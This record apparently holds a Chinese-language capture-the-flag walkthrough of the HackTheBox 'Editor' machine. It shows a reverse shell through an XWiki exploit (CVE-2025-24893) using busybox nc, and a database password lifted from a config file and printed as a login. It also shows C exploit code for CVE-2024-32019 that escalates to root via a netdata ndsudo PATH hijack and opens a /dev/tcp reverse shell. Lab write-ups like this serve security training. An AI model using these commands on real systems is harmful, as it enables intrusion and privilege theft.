{
  "id": 1760068434083,
  "title": "HackTheBox Editor",
  "slug": "htb-editor",
  "date": "2025-09-07",
  "isEncrypted": false,
  "html": "<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757224316805-7abc6257-b8b7-4aef-826e-ee41b98a2b27.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">nmap -T4 -v -A -Pn 10.10.11.80 -oN editor.txt\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757224341430-2467349a-a494-4de4-b3aa-d266f9270038.png\" alt=\"\"></p>\n<p>80 和 8080 两个端口</p>\n<h1>USER</h1>\n<h2>CVE-2025-24893</h2>\n<p>在 8080 端口有 xwiki</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757226066299-7262817f-f165-4536-b1d7-a699a629dfe9.png\" alt=\"\"></p>\n<p><a href=\"https://github.com/gunzf0x/CVE-2025-24893.git\">https://github.com/gunzf0x/CVE-2025-24893</a></p>\n<p>有这个漏洞，可以测试看到成功执行</p>\n<pre><code class=\"language-bash\">python CVE-2025-24893.py -t &quot;http://editor.htb:8080&quot; -c &#39;busybox nc 10.10.14.45 8081 -e /bin/bash&#39;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757318776533-389fbf8b-6310-49d3-86f1-64c320b7555d.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757318788153-4ae836bb-61ab-4e8a-afb7-488ef0cb8757.png\" alt=\"\"></p>\n<p>起一个伪终端</p>\n<pre><code class=\"language-bash\">python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;);&quot;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757319261962-00180e33-0191-435b-9a64-8da9c668cd85.png\" alt=\"\"></p>\n<h2><font style=\"color:rgb(72, 72, 72);\">configuration file</font></h2>\n<p>/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml 是 xwiki 数据库的配置文件</p>\n<p>查看一下</p>\n<p>可以发现配置信息包含密码</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757320625271-9f842554-bcce-4301-8270-62c89897b697.png\" alt=\"\"></p>\n<p>/home目录下只有一个 oliver 账户</p>\n<p>使用这个密码可以成功登录，并有 user.txt</p>\n<p>oliver:theEd1t0rTeam99</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757320789253-62e9c50a-8700-4b83-8f7d-a299635e0ca9.png\" alt=\"\"></p>\n<h1>ROOT</h1>\n<h2>CVE-2024-32019</h2>\n<p>sudo -l 没东西，传 linpeas.sh</p>\n<p> 在结果里面我们可以看到有 netdata 这个 user，这是一个性能监控的开源系统</p>\n<p>而且有很多应该是他自带的程序</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757321978833-389b6d30-6f5a-4be8-aa75-887f90295597.png\" alt=\"\"></p>\n<p>问了 ai，这个 ndsudo 应该可以利用一下</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757322039889-1d3463cf-da63-41ec-9b72-6954c0f74865.png\" alt=\"\"></p>\n<p><a href=\"https://github.com/AliElKhatteb/CVE-2024-32019-POC\">https://github.com/AliElKhatteb/CVE-2024-32019-POC</a></p>\n<pre><code class=\"language-bash\">#include &lt;unistd.h&gt;  // for setuid, setgid, execl\n#include &lt;stddef.h&gt;  // for NULL\n\nint main() {\n    setuid(0);\n    setgid(0);\n    execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/ADD_YOU_IP_ADDRESS/9001 0&gt;&amp;1&quot;, NULL);\n    return 0;\n}\n</code></pre>\n<p>gcc 编译好之后传到目标机器</p>\n<p>然后用 ndsudo 来执行</p>\n<pre><code class=\"language-bash\">mv exp /tmp/nvme\nchmod +x /tmp/nvme\nexport PATH=/tmp:$PATH\n/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757322587608-706dc546-5b40-4dda-949d-2013c0dd300a.png\" alt=\"\"></p>\n<p>就能接收到反弹了，看到 root.txt </p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757322607126-0a6ee6a1-3823-485d-9995-23e384a58adf.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757322667190-4e4b7cd8-f075-4aed-949a-55557c7c67d9.png\" alt=\"\"></p>\n"
}